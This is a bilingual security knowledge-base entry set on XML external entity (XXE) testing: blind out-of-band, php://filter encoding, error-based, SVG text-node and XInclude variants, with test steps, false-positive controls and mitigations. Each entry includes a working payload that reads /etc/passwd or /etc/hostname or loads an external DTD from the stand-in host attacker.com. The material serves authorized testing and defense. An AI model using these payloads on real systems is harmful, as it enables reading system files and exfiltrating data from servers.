prerequisites.en: Parameter entities reference only a fixed marker inside the parser sandbox or an owned empty DTD, preserving complete XML, entity-resolver callbacks, file audit, and parse result.

analysis.zh: 阳性证据是目标 parser 展开参数实体并让其内容参与后续实体声明，最终 marker 出现在元素值或解析回调中，解析链连续。 假阳性边界：单独提交三行导致语法错误、DOCTYPE 被识别但实体禁用、实体名原样保留、路径出现在错误、普通内部实体展开或客户端 parser 行为均不是参数实体 XXE。
analysis.en: Positive evidence requires the target parser to expand the parameter entity and use its content in a subsequent entity declaration, placing the marker in an element value or parser callback with a continuous parse chain. False-positive boundary: Syntax errors from submitting fragments separately, recognized DOCTYPE with entities disabled, literal entity names, paths in errors, ordinary internal-entity expansion, or client-parser behavior does not prove parameter-entity XXE.

opsecTips.zh: 参数实体测试限制一个短 marker，禁止递归/指数实体和真实文件；出现外连、实体扩张、内存/CPU 增长、真实内容或 parser 崩溃时停止。
opsecTips.en: Parameter-entity testing uses one short marker and forbids recursive or exponential entities and real files; stop on egress, entity expansion, memory or CPU growth, real content, or parser crash.

opsecTips.zh: 删除 XML/DTD/marker 和解析产物，清理 parser/应用缓存与错误日志，恢复禁用 DTD/外部实体配置并重启 worker。
opsecTips.en: Delete XML, DTD, markers, and parse artifacts, clear parser and application caches plus error logs, restore disabled DTD and external-entity settings, and restart workers.

name.zh: Blind XXE 带外实体解析

description.zh: 用于无直接回显的 XML 解析场景，通过授权回调端点确认外部 DTD 或实体是否被服务器解析。
description.en: Targets XML parsing without direct reflection and uses an authorized callback endpoint to confirm external DTD or entity resolution.

overview.zh: Blind XXE 不会在 HTTP 响应中直接显示实体内容，证据来自解析任务向受控域发出的 DNS 或 HTTP 请求。测试必须使用唯一随机子域、严格时间窗和应用日志关联，否则扫描器、预取、邮件安全网关或其他服务访问同一域都可能造成误判。
overview.en: Blind XXE does not reflect entity content in the HTTP response. Evidence comes from DNS or HTTP requests made by the parsing job to a controlled domain. Use a unique random subdomain, strict time window, and application-log correlation because scanners, prefetchers, mail gateways, and other services can otherwise cause false positives.

vulnerability.zh: 根因是 XML 解析器允许外部参数实体或外部 DTD，并且处理进程拥有出站网络能力。请求发生可能早于或晚于前端响应，代理也可能代为解析 URL；因此仅收到一次回调不足以确认，必须匹配任务 ID、来源网络和实体路径。
vulnerability.en: The root cause is an XML parser that allows external parameter entities or external DTDs while the processing service has egress. Requests may occur before or after the frontend response, and a proxy may inspect URLs, so one callback is insufficient without matching the job ID, source network, and entity path.

exploitation.zh: 1. 为单次解析生成唯一随机回调主机和路径并记录开始/结束时间；2. 提交现有 Blind XXE 样例，同时采集应用任务、DNS、HTTP 和出站代理日志；3. 用普通 URL 字符串、禁用 DTD 和不存在域作对照。观察证据是解析任务在时间窗内请求完整唯一实体路径；安全网关预取、人工访问和无任务关联的 DNS 查询属于假阳性。
exploitation.en: 1. Generate a unique random callback host and path for one parse job and record the time window. 2. Submit the existing Blind XXE sample while collecting application job, DNS, HTTP, and egress-proxy logs. 3. Compare a plain URL string, DTD-disabled input, and a nonexistent domain. Evidence is a request for the complete unique entity path from the parsing job within the window; security-gateway prefetch, manual visits, and uncorrelated DNS are false positives.

mitigation.zh: 1. 禁用外部 DTD 与参数实体并提供拒绝外部 URI 的 resolver；2. 对解析容器实施默认拒绝出站网络，仅开放明确业务目标；3. 使用低权限与只读文件系统降低回调后可访问范围；4. 记录解析任务、DOCTYPE、DNS/HTTP 出站和 resolver 拒绝事件并建立 OOB 回归测试。
mitigation.en: 1. Disable external DTDs and parameter entities and use a resolver that rejects external URIs. 2. Deny egress by default for parser containers and allow only explicit business destinations. 3. Use low privilege and a read-only file system to reduce accessible scope. 4. Correlate parse jobs, DOCTYPE use, DNS and HTTP egress, and resolver denials and maintain OOB regression tests.

title.zh: 生成单任务回调标识

description.zh: 为本次解析创建不可复用的主机名和路径，并在 DNS、HTTP 和应用日志中预置关联字段。
description.en: Create a nonreusable hostname and path for this parse and prepare correlation fields in DNS, HTTP, and application logs.

title.zh: 提交外部 DTD 样例

description.zh: 运行现有 Blind XXE 输入并记录解析任务开始、结束、工作进程和响应时间。
description.en: Run the existing Blind XXE input and record parse-job start, end, worker process, and response timing.

attackChain.payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&exfil;</data>

title.zh: 关联完整回调路径

description.zh: 只有解析工作进程在时间窗内访问完整唯一实体路径才确认，排除预取器和人工请求。
description.en: Confirm only when the parser worker requests the complete unique entity path within the time window, excluding prefetchers and manual requests.

title.zh: 阻断 resolver 与出站后复测
title.en: Retest after resolver and egress blocking

description.zh: 关闭外部实体并默认拒绝解析容器出站，再使用新标识复测，确认无 DNS 或 HTTP 回调。
description.en: Disable external entities and deny parser-container egress by default, then retest with a new identifier and confirm no DNS or HTTP callback occurs.

review.rationale: 该条是无回显 XXE 的外部 DTD 输入，应作为 Blind XXE Payload。

prerequisites.zh: 无直接回显的 XML 输入确实进入服务端 parser，外部参数实体/DTD 网络访问未被配置禁止，出站 DNS/HTTP 可审计。
prerequisites.en: A nonreflective XML input reaches a server-side parser, external parameter-entity or DTD access is not disabled, and outbound DNS or HTTP is auditable.

prerequisites.zh: attacker.com 替换为自有令牌化 DTD 端点，DTD 不读取真实文件且只触发一次无内容回调；应用请求和回调共享 token。
prerequisites.en: attacker.com is replaced by an owned tokenized DTD endpoint that reads no real file and triggers one content-free callback, with the application request and callback sharing a token.

analysis.zh: 阳性证据是目标解析进程因特定 XML 请求解析外部 DTD/实体并向自有端点发送令牌请求，源 IP、时间、User-Agent 和 parser 日志可关联。 假阳性边界：分析机/扫描器访问 DTD、DNS 预解析、应用普通 URL fetch、WAF 回调、只看到 XML fault、未关联请求或客户端 parser 外连均不是 Blind XXE。
analysis.en: Positive evidence requires the target parser process to resolve the external DTD or entity because of the specific XML request and send a tokenized request to the owned endpoint, correlating source IP, time, user agent, and parser logs. False-positive boundary: DTD access from an analyst or scanner, DNS pre-resolution, an ordinary application URL fetch, a WAF callback, an XML fault alone, an uncorrelated request, or client-parser egress does not prove Blind XXE.

opsecTips.zh: Blind XXE 仅允许一次自有回调，不读取 /etc/passwd 或任何真实文件；出现重复请求、第三方目标、数据进入 URL、重定向或 worker 压力时停止。
opsecTips.en: Blind XXE permits one owned callback only and never reads system or real files; stop on repeated requests, third-party targets, data entering the URL, redirects, or worker pressure.

opsecTips.zh: 关闭 DTD/DNS/HTTP 端点，删除 token/XML/DTD 和回调日志，清理解析队列与缓存，恢复出站和实体解析限制。
opsecTips.en: Close DTD, DNS, and HTTP endpoints, delete tokens, XML, DTDs, and callback logs, clear parser queues and caches, and restore egress and entity-resolution restrictions.

name.zh: XXE 特殊字符编码与外部 DTD 组合
name.en: XXE Special-Character Encoding with an External DTD

description.zh: 验证外部 DTD 与编码包装能否让包含 XML 特殊字符的受控内容进入解析结果，重点核对解析器和运行时支持。
description.en: Verifies whether an external DTD and encoding wrapper can carry controlled content containing XML metacharacters into parser output, with processor and runtime support explicitly checked.

overview.zh: 普通实体内容含有 `<`、`&` 等字符时可能破坏 XML 结构，因此某些测试通过外部 DTD、CDATA 包装或运行时编码流先转换内容。当前样例使用 PHP stream wrapper，只有底层解析环境支持该 URI scheme 时才适用，不能当作所有 XML 解析器的通用能力。
overview.en: Entity content containing `<`, `&`, or related characters can break XML structure, so some tests combine an external DTD, CDATA wrapping, or an encoding stream. The current sample uses a PHP stream wrapper and applies only when the underlying environment supports that URI scheme; it is not universal XML parser behavior.

vulnerability.zh: 根因仍是外部实体和外部 DTD 可用，同时 resolver 接受超出业务需要的 URI scheme。编码成功、外部 DTD 加载和实体回显是三个独立条件；看到 base64 字符串或解析错误不能单独证明读取了目标资源，必须用预置无害标记验证。
vulnerability.en: The root cause remains enabled external entities and DTDs combined with a resolver accepting URI schemes beyond business need. Encoding, external-DTD loading, and entity reflection are separate conditions. A base64-looking string or parse error alone does not prove resource access; use a prepositioned harmless marker.

exploitation.zh: 1. 在隔离容器创建只含随机标记的测试文件并确认运行时是否支持所用 URI scheme；2. 提交现有外部 DTD/编码样例，记录 DTD 请求、解析输出和解码结果；3. 用不存在文件、禁用 wrapper 和普通文本对照。观察证据是输出可解码为预置标记且任务日志存在对应访问；任意 base64、错误堆栈或 DTD 请求本身属于假阳性。
exploitation.en: 1. Create a test file containing only a random marker in an isolated container and confirm whether the runtime supports the URI scheme. 2. Submit the existing external-DTD and encoding sample and record DTD requests, parser output, and decoded result. 3. Compare a missing file, disabled wrapper, and plain text. Evidence is output that decodes to the marker plus correlated job access; arbitrary base64, stack traces, or a DTD request alone are false positives.

mitigation.zh: 1. 禁用外部 DTD、通用实体和参数实体；2. 将 resolver 限制为无外部 URI，显式拒绝 file、php、jar 等非业务 scheme；3. 在低权限、无网络容器解析并限制可见文件；4. 对 URI scheme、外部 DTD 请求和异常编码结果建立审计与回归测试。
mitigation.en: 1. Disable external DTDs, general entities, and parameter entities. 2. Restrict the resolver to no external URIs and explicitly reject nonbusiness schemes such as file, php, and jar. 3. Parse in a low-privilege, no-network container with a minimal file view. 4. Audit URI schemes, external-DTD requests, and unusual encoded output and add regression tests.

title.zh: 验证运行时 URI 支持

description.zh: 在隔离环境确认解析器是否识别样例中的编码 wrapper，并准备只含随机标记的文件。
description.en: In isolation, confirm whether the parser recognizes the encoding wrapper and prepare a file containing only a random marker.

title.zh: 运行编码实体组合

description.zh: 提交现有外部 DTD 与编码输入，收集 DTD 请求、resolver 日志、解析输出和任务标识。
description.en: Submit the existing external-DTD and encoding input and collect DTD requests, resolver logs, parser output, and the job identifier.

attackChain.payload:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
<data>&all;</data>

title.zh: 解码并核对唯一标记
title.en: Decode and match the unique marker

description.zh: 只有解析输出可解码为预置标记且访问日志一致才确认，排除随机 base64 和普通错误。
description.en: Confirm only when parser output decodes to the prepositioned marker and access logs agree, excluding random base64 and ordinary errors.

title.zh: 限制 URI scheme 后回归

description.zh: 关闭外部实体并拒绝非业务 scheme 后重放样例，确认正常 XML 可处理而 wrapper 不再解析。
description.en: Disable external entities, reject nonbusiness schemes, and replay the sample to confirm normal XML works while the wrapper no longer resolves.

review.rationale: 该条是依赖外部 DTD 与 URI wrapper 的 XML 输入，应作为特定环境 XXE Payload。

prerequisites.zh: 目标 parser 支持外部参数实体，外部 DTD 能定义包装实体，运行时还明确支持待测 php://filter 等 scheme；否则应替换为普通 marker。
prerequisites.en: The target parser supports external parameter entities, an external DTD can define wrapper entities, and the runtime explicitly supports a tested scheme such as php://filter; otherwise a plain marker is substituted.

prerequisites.zh: 使用自有 DTD 和只含 XML 特殊字符的无敏感 marker，记录 DTD 请求、scheme resolver、实体展开结果与完整编码字节。
prerequisites.en: An owned DTD and nonsensitive marker containing XML special characters record DTD requests, scheme resolver behavior, entity-expansion results, and exact encoded bytes.

analysis.zh: 阳性证据是 parser 获取自有 DTD、读取 marker，经包装/编码后将包含特殊字符的值安全组合到解析结果，三个解析阶段均可证明。 假阳性边界：php:// 字符串存在、运行时不支持该 scheme、仅 DTD 回调、Base64 文本由客户端生成、解析错误含路径或实体值被拒绝均不能证明内容读取。
analysis.en: Positive evidence requires the parser to fetch the owned DTD, read the marker, and place its wrapped or encoded special-character value into the parse result, proving all three resolution stages. False-positive boundary: A php:// string, unsupported runtime scheme, DTD callback alone, client-generated Base64, paths in parser errors, or rejected entity values does not prove content reading.

opsecTips.zh: CDATA/编码 XXE 只使用短特殊字符 marker，不读取真实文件或把内容外带；出现数据量增长、公共请求、递归实体、敏感输出或 parser 异常时停止。
opsecTips.en: CDATA and encoding XXE uses a short special-character marker only and never reads or exfiltrates real files; stop on data growth, public requests, recursive entities, sensitive output, or parser anomalies.

opsecTips.zh: 删除 XML、外部 DTD、marker 与编码产物，关闭 resolver 端点，清理 parser 缓存/错误日志并恢复 scheme/实体限制。
opsecTips.en: Delete XML, external DTDs, markers, and encoded artifacts, close resolver endpoints, clear parser caches and error logs, and restore scheme and entity restrictions.

name.zh: 基于解析错误的 XXE 证据回显

description.zh: 验证 XML 解析错误是否会携带由外部 DTD 组合出的受控内容，并区分真实实体访问与普通错误堆栈。
description.en: Verifies whether XML parse errors carry controlled content composed by an external DTD and distinguishes entity access from ordinary stack traces.

overview.zh: 错误型 XXE 利用解析器在处理无效资源 URI 或嵌套实体时把构造后的值写入异常消息，适用于正常响应不回显实体的场景。它高度依赖解析器错误格式、是否加载外部 DTD 以及应用是否向客户端暴露详细错误。
overview.en: Error-based XXE relies on a parser placing a composed value into an exception while resolving an invalid resource URI or nested entity. It applies when normal responses do not reflect entities and depends heavily on parser error formatting, external-DTD loading, and whether detailed errors reach the client.

vulnerability.zh: 根因包含两层：解析器允许外部实体/DTD，应用又暴露包含敏感 URI 的详细异常。单个“找不到文件”或远程 DTD 请求只能证明部分条件；必须使用无害随机标记确认该标记经过实体组合进入同一解析任务的错误信息。
vulnerability.en: The root cause has two layers: the parser permits external entities or DTDs, and the application exposes detailed exceptions containing a sensitive URI. A missing-file error or remote DTD request proves only part of the chain; a harmless random marker must pass through entity composition into the error for the same parse job.

exploitation.zh: 1. 在隔离环境准备仅含随机标记的测试资源和唯一外部 DTD；2. 提交现有错误型样例并收集客户端响应、服务端异常、resolver 和任务日志；3. 比较不存在资源、普通语法错误和关闭详细错误三种对照。观察证据是唯一标记出现在与任务一致的实体解析异常；通用堆栈、固定路径和代理错误页属于假阳性。
exploitation.en: 1. In isolation, prepare a test resource containing only a random marker and a unique external DTD. 2. Submit the existing error-based sample and collect client response, server exception, resolver logs, and job logs. 3. Compare missing-resource, ordinary syntax-error, and detailed-error-disabled controls. Evidence is the unique marker in an entity-resolution exception for the same job; generic stacks, fixed paths, and proxy error pages are false positives.

mitigation.zh: 1. 禁用所有外部实体和 DTD，并以拒绝外部 URI 的 resolver 兜底；2. 生产环境返回统一错误标识，不向客户端暴露解析器路径和异常细节；3. 将详细异常保留在受控日志并进行敏感字段脱敏；4. 监控 DOCTYPE、外部 DTD 和实体错误频率并添加错误型 XXE 回归测试。
mitigation.en: 1. Disable all external entities and DTDs and use a resolver that rejects external URIs. 2. Return a uniform error identifier in production without parser paths or exception details. 3. Keep detailed exceptions only in controlled logs with sensitive-field redaction. 4. Monitor DOCTYPE, external-DTD, and entity-error frequency and add error-based XXE regression tests.

title.zh: 准备无害错误标记资源

description.zh: 创建只含随机标记的本地测试资源和一次性外部 DTD，记录解析任务关联信息。
description.en: Create a local test resource containing only a random marker and a one-time external DTD and record parse-job correlation data.

title.zh: 触发实体组合错误

description.zh: 提交现有错误型 XXE 输入，同时采集客户端、服务端和 resolver 的完整错误链。
description.en: Submit the existing error-based XXE input while collecting the complete client, server, and resolver error chain.

attackChain.payload:
<!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
%xxe;
%payload;
%remote;
<data>test</data>

title.zh: 匹配任务与唯一标记
title.en: Match the job and unique marker

description.zh: 只有同一任务的实体异常包含唯一标记才确认，排除通用错误页、固定堆栈和代理生成内容。
description.en: Confirm only when the entity exception for the same job contains the unique marker, excluding generic error pages, fixed stacks, and proxy-generated content.

title.zh: 关闭详细错误与实体后复测
title.en: Retest after disabling entities and detailed errors

description.zh: 关闭外部实体、统一客户端错误并重放样例，确认日志受控且响应不再泄露实体信息。
description.en: Disable external entities, standardize client errors, and replay the sample to confirm logs remain controlled and responses no longer expose entity information.

review.rationale: 该条利用 XML 解析错误承载实体证据，属于错误型 XXE Payload。

prerequisites.zh: XML parser 会获取外部 DTD，应用会把 parser exception 的受控部分返回或记录到可观察但授权的错误通道。
prerequisites.en: The XML parser fetches an external DTD, and the application returns or logs a controlled part of parser exceptions through an observable authorized error channel.

prerequisites.zh: 自有 error.dtd 仅把固定 marker 组合进无害的不存在 URI/实体错误，保存 DTD token、parser 日志、HTTP 响应和异常链。
prerequisites.en: An owned error.dtd places only a fixed marker into a harmless nonexistent URI or entity error, preserving DTD token, parser logs, HTTP response, and exception chain.

analysis.zh: 阳性证据是目标 parser 获取 DTD、展开 marker 并在同一请求的异常文本中返回该 marker；如涉及文件内容，必须另有专用 marker 文件审计。 假阳性边界：普通 XML stack trace、DTD URL 出现在错误、固定错误模板、分析端拼接 marker、仅外部回调或不同请求的异常均不能证明错误型实体展开。
analysis.en: Positive evidence requires the target parser to fetch the DTD, expand the marker, and return it in exception text for the same request; any file-content claim additionally needs dedicated marker-file audit. False-positive boundary: An ordinary XML stack trace, a DTD URL in errors, a fixed error template, analyst-side marker construction, an external callback alone, or an exception from another request does not prove error-based entity expansion.

opsecTips.zh: 错误型 XXE 每轮只制造一次可控错误，不使用真实路径或大内容；出现敏感错误回显、日志洪泛、监控告警、重试风暴或服务降级时停止。
opsecTips.en: Error-based XXE creates one controlled error per run and uses no real paths or large content; stop on sensitive error reflection, log flooding, monitoring alerts, retry storms, or service degradation.

opsecTips.zh: 关闭 DTD endpoint，删除 XML/token/marker 和错误日志副本，清理告警/重试队列，恢复统一错误处理与实体限制。
opsecTips.en: Close the DTD endpoint, delete XML, tokens, markers, and error-log copies, clear alert and retry queues, and restore uniform error handling and entity restrictions.

name.zh: SVG 文本节点外部实体回显

description.zh: 验证服务端 SVG 解析或栅格化时是否把外部实体展开到 text 节点及其派生输出。
description.en: Verifies whether server-side SVG parsing or rasterization expands an external entity into a text node and derived output.

overview.zh: 该条聚焦最小 SVG 文本节点：实体值被放入 `<text>` 后，可能在预览、栅格图、OCR 或抽取文本中留下证据。与大型 SVG 变体集合相比，它更适合判断单一解析器是否展开实体，也便于使用无害标记控制输出。
overview.en: This entry focuses on a minimal SVG text node. If an entity expands into `<text>`, evidence may appear in preview, raster output, OCR, or extracted text. Compared with broad SVG variant sets, it better isolates whether one parser resolves entities and supports harmless marker controls.

vulnerability.zh: 根因是服务端图片组件把 SVG 作为普通 XML 解析并允许 DTD/外部实体，同时转换进程可访问目标资源。浏览器显示 `<text>`、SVG 源码包含实体声明或图片尺寸读取成功都不等于实体已展开，必须检查派生输出或解析日志。
vulnerability.en: The root cause is a server-side image component treating SVG as ordinary XML with DTD and external entities enabled while the converter can access the resource. Browser text rendering, an entity declaration in source, or successful dimension reading does not mean expansion occurred; derived output or parser logs are required.

exploitation.zh: 1. 在隔离转换容器准备仅含随机主机名的测试文件；2. 提交现有最小 SVG 样例并触发实际预览或栅格化；3. 比较无 DOCTYPE、字面文本和不存在资源三个版本。观察证据是随机标记出现在派生图像/OCR/文本或实体访问日志；仅原始源码可见、图片破损或浏览器渲染属于假阳性。
exploitation.en: 1. Prepare a test file containing only a random hostname in an isolated converter. 2. Submit the existing minimal SVG sample and trigger the real preview or rasterization. 3. Compare no-DOCTYPE, literal-text, and missing-resource versions. Evidence is the marker in derived image, OCR, text, or entity-access logs; visible source, broken images, and browser rendering are false positives.

mitigation.zh: 1. 在 SVG/XML 解析器中禁用 DOCTYPE 和外部实体；2. 将原始 SVG 清洗或栅格化，后续仅使用净化产物；3. 让转换器无网络、低权限并只能读取任务目录；4. 对文本节点实体声明、解析异常和派生输出建立自动回归测试。
mitigation.en: 1. Disable DOCTYPE and external entities in SVG and XML parsers. 2. Sanitize or rasterize original SVG and use only sanitized output downstream. 3. Run converters without network, with low privilege, and with access only to the job directory. 4. Add automated regression tests for entity declarations in text nodes, parser exceptions, and derived output.

title.zh: 准备文本节点标记

description.zh: 在隔离任务目录创建只含随机无害标记的文件，并记录正常 SVG 文本节点输出基线。
description.en: Create a file containing only a random harmless marker in the isolated job directory and record the baseline for a normal SVG text node.

title.zh: 运行最小 SVG 实体输入
title.en: Run the minimal SVG entity input

description.zh: 提交现有 text 节点 XXE 样例并触发服务器实际使用的预览、OCR 或栅格化动作。
description.en: Submit the existing text-node XXE sample and trigger the actual server-side preview, OCR, or rasterization action.

attackChain.payload:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

title.zh: 检查派生输出与访问日志
title.en: Inspect derived output and access logs

description.zh: 将派生图片、OCR 文本、抽取内容和解析器文件访问关联到同一任务，排除原始源码回显。
description.en: Correlate derived image, OCR text, extracted content, and parser file access with the same job, excluding raw-source reflection.

title.zh: 净化或转码后复测

description.zh: 关闭实体解析并只保留安全位图后重复样例，确认随机标记不再进入任何派生结果。
description.en: Disable entity resolution, retain only a safe bitmap, and repeat the sample to confirm the marker no longer reaches any derived output.

review.rationale: 该条是最小 SVG text 节点实体输入，属于 SVG XXE Payload。

prerequisites.zh: 服务端 SVG parser 或栅格化器解析 DOCTYPE 与 text 节点，输出可通过文档模型、文本提取或图像预览观察。
prerequisites.en: A server-side SVG parser or rasterizer processes the DOCTYPE and text node, with output observable through the document model, text extraction, or image preview.

prerequisites.zh: 实体只指向 worker 沙箱内固定短 marker，记录 SVG 上传 ID、解析进程文件审计、text 节点值与派生预览/OCR。
prerequisites.en: The entity points only to a short fixed marker inside the worker sandbox, recording SVG upload identifier, parser-process file audit, text-node value, and derived preview or OCR.

analysis.zh: 阳性证据是服务端解析进程读取 marker 并把其内容展开到 SVG text 节点，随后在解析树或派生输出中可验证，任务链一致。 假阳性边界：浏览器端显示 marker、源 XML 有实体、预览仅显示实体名/空白、客户端 SVG viewer 展开、OCR 偶然匹配或文件错误都不是服务端读取。
analysis.en: Positive evidence requires the server-side parser to read the marker and expand its content into the SVG text node, verifiable in the parse tree or derived output with a consistent job chain. False-positive boundary: Client-side marker display, an entity in source XML, a preview showing the entity name or blank, client SVG viewer expansion, coincidental OCR matches, or file errors does not prove a server read.

opsecTips.zh: SVG text XXE 只读无敏感 marker；出现真实文件、外连、图像尺寸/内存异常、OCR 队列积压、worker 崩溃或输出扩散时停止。
opsecTips.en: SVG text-node XXE reads a nonsensitive marker only; stop on real files, egress, image-size or memory anomalies, OCR backlog, worker crashes, or output propagation.

opsecTips.zh: 删除 SVG、marker、解析树/预览/OCR 产物，清理图像任务队列和缓存，重启隔离 parser/rasterizer。
opsecTips.en: Delete SVGs, markers, parse trees, previews, and OCR artifacts, clear image job queues and caches, and restart isolated parsers or rasterizers.

name.zh: XInclude 外部资源包含

description.zh: 验证 XML 解析流程是否显式执行 XInclude，从而在没有可控 DOCTYPE 的情况下读取外部文本资源。
description.en: Verifies whether an XML pipeline explicitly processes XInclude and can read an external text resource without a controllable DOCTYPE.

overview.zh: XInclude 与 DTD 外部实体是不同机制：输入通过 `xi:include` 引用资源，只有应用或解析库显式执行 XInclude 处理时才会加载。它适用于无法控制完整 XML 文档头、但能注入元素的场景，因此测试必须先确认目标流水线启用了 XInclude。
overview.en: XInclude is distinct from DTD external entities. Input references a resource through `xi:include`, and loading occurs only when the application or library explicitly performs XInclude processing. It is relevant when the document prolog is not controllable but element injection is possible, so XInclude support must be confirmed first.

vulnerability.zh: 根因是应用对不可信 XML 调用 XInclude 展开，同时 resolver 可访问 file 或网络 URI。很多解析器默认不处理 XInclude，普通命名空间被接受也不代表包含已执行；必须观察受控资源进入解析结果或相关 resolver 日志。
vulnerability.en: The root cause is invoking XInclude expansion on untrusted XML while the resolver can access file or network URIs. Many parsers do not process XInclude by default, and acceptance of the namespace does not mean inclusion occurred. A controlled resource in output or corresponding resolver logs is required.

exploitation.zh: 1. 先用内联 fallback 或授权 HTTP 文本确认目标是否执行 XInclude；2. 在隔离环境提交现有 `xi:include parse="text"` 样例并记录解析输出；3. 比较禁用 XInclude、错误命名空间和不存在资源。观察证据是预置随机标记进入结果且 resolver 记录匹配；元素原样保留、命名空间可解析或普通文件错误属于假阳性。
exploitation.en: 1. First use inline fallback or authorized HTTP text to determine whether the target processes XInclude. 2. In isolation, submit the existing `xi:include parse="text"` sample and record parser output. 3. Compare XInclude-disabled, wrong-namespace, and missing-resource cases. Evidence is the marker in output with matching resolver logs; preserved elements, namespace acceptance, and ordinary file errors are false positives.

mitigation.zh: 1. 不对不可信 XML 调用 XInclude 处理；2. 必须使用时采用严格资源白名单和拒绝 file/私网/远程 URI 的 resolver；3. 在无网络、低权限、最小文件视图的容器中解析；4. 记录 XInclude 元素、解析后的最终 URI 和拒绝事件并增加回归测试。
mitigation.en: 1. Do not invoke XInclude processing for untrusted XML. 2. If required, use a strict resource allowlist and a resolver that rejects file, private-network, and remote URIs. 3. Parse in a no-network, low-privilege container with a minimal file view. 4. Log XInclude elements, final resolved URIs, and denials and add regression tests.

title.zh: 确认 XInclude 处理开关

description.zh: 通过安全 fallback 或授权文本资源判断目标是否实际执行 XInclude，而不是只接受命名空间。
description.en: Use a safe fallback or authorized text resource to determine whether the target executes XInclude rather than merely accepting the namespace.

title.zh: 提交 parse=text 包含样例

description.zh: 在隔离解析流程运行现有 XInclude 输入，并记录最终 URI、resolver 日志和解析结果。
description.en: Run the existing XInclude input in an isolated parser and record the final URI, resolver logs, and parsed result.

attackChain.payload:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>

title.zh: 用禁用与错误命名空间对照

description.zh: 分别关闭 XInclude、修改命名空间和使用不存在资源，确认唯一标记只在真实包含时出现。
description.en: Disable XInclude, alter the namespace, and use a missing resource to confirm that the unique marker appears only after real inclusion.

title.zh: 移除 XInclude 或限制 resolver
title.en: Remove XInclude or restrict the resolver

description.zh: 关闭处理开关或设置资源白名单后重放样例，确认正常 XML 仍可处理且外部文本不再包含。
description.en: Disable the processing switch or apply a resource allowlist, then replay the sample to confirm normal XML works and external text is no longer included.

review.rationale: 该条是 XInclude 元素输入，仍属 XML 外部资源包含类 Payload。

prerequisites.zh: 目标 XML 处理流程显式调用 XInclude 处理（如 xinclude()/setXIncludeAware），并允许 parse=text 的外部 href。
prerequisites.en: The target XML flow explicitly invokes XInclude processing, such as xinclude() or setXIncludeAware, and permits external href values with parse=text.

prerequisites.zh: xi:include 只引用 parser 沙箱内固定 marker，保存 XInclude 开关、resolver 调用、文件审计、包含前后 DOM 和请求 ID。
prerequisites.en: xi:include references only a fixed marker inside the parser sandbox, preserving XInclude settings, resolver calls, file audit, DOM before and after inclusion, and request identifier.

analysis.zh: 阳性证据是应用显式 XInclude 阶段解析 href、读取 marker 并将文本节点插入最终 XML 模型；无需也不依赖 DOCTYPE。 假阳性边界：XML namespace/xi 标签被 parser 接受但未执行 XInclude、href 字符串存在、文件错误、客户端工具包含成功或外部实体已禁用都不能判断 XInclude。
analysis.en: Positive evidence requires the application's explicit XInclude phase to resolve href, read the marker, and insert its text into the final XML model without relying on a DOCTYPE. False-positive boundary: Parser acceptance of the namespace or xi tag without executing XInclude, an href string, file errors, successful inclusion in a client tool, or disabled external entities does not prove XInclude processing.

opsecTips.zh: XInclude 测试只包含一个短 marker，禁止真实文件、递归 include、fallback 链和远程 URL；出现外连、扩张、文件泄露或 parser 异常时停止。
opsecTips.en: XInclude testing includes one short marker only and forbids real files, recursive includes, fallback chains, and remote URLs; stop on egress, expansion, file disclosure, or parser anomalies.

opsecTips.zh: 删除 XML/marker 和包含后产物，清理 resolver/parser 缓存与日志，恢复 XInclude 禁用或 href allowlist 后回归。
opsecTips.en: Delete XML, markers, and post-inclusion artifacts, clear resolver and parser caches and logs, restore disabled XInclude or href allowlists, and regress.

name.zh: XXE 多格式与多协议验证集合
name.en: Multi-Format and Multi-Protocol XXE Validation Set

description.zh: 汇总基础 XML、SVG、Office XML、远程 DTD 和协议变体，用于按解析器能力建立 XXE 测试矩阵。
description.en: Collects basic XML, SVG, Office XML, remote DTD, and protocol variants to build an XXE test matrix by parser capability.

overview.zh: 该集合包含多种容器、实体类型和 URI scheme，适合已知系统存在多个 XML 入口时做覆盖盘点，而不适合一次性全部投递。正确方法是先按基础 XML、文档部件、SVG、远程 DTD 和特定协议分组，再绑定到实际解析组件和业务动作。
overview.en: This set spans multiple containers, entity types, and URI schemes. It is useful for coverage inventory across known XML entry points but should not be sent all at once. Group cases into basic XML, document parts, SVG, remote DTD, and processor-specific schemes and map each to the real parser and business action.

vulnerability.zh: 根因并非所有格式共享同一个漏洞，而是不同入口可能复用不安全的 XML 工厂、resolver 或高权限转换服务。某一格式命中不能推断其他格式也命中，某个协议被拒绝也不能证明 DTD 已关闭；每个解析器、入口和能力都需要独立证据。
vulnerability.en: The root cause is not one universal flaw across all formats. Different entry points may reuse an unsafe XML factory, resolver, or privileged converter. A hit in one format does not prove another, and a rejected URI scheme does not prove DTDs are disabled. Each parser, entry, and capability needs separate evidence.

exploitation.zh: 1. 建立入口—格式—解析器—版本矩阵，并为每组选择一个无害随机标记；2. 分批运行现有综合样例，记录具体业务动作、任务 ID、输出和 resolver 日志；3. 为每组加入无 DOCTYPE、禁用外部资源和不存在目标对照。观察证据必须精确归属到某解析器和能力；通用 500、批量超时或其他入口产生的回调属于假阳性。
exploitation.en: 1. Build an entry-format-parser-version matrix and choose a harmless random marker for each group. 2. Run the existing comprehensive set in batches and record the business action, job ID, output, and resolver logs. 3. Add no-DOCTYPE, external-access-disabled, and missing-target controls for every group. Evidence must map to one parser and capability; generic 500 responses, batch timeouts, and callbacks from another entry are false positives.

mitigation.zh: 1. 在共享 XML 工厂层统一禁用 DTD、外部实体、外部 schema 和 XInclude；2. 为各文档/图片转换器设置无网络、低权限和最小文件视图；3. 对 resolver 实施协议、主机和路径默认拒绝；4. 按入口维护回归矩阵、组件清单和安全配置漂移检测，避免只修复单个格式。
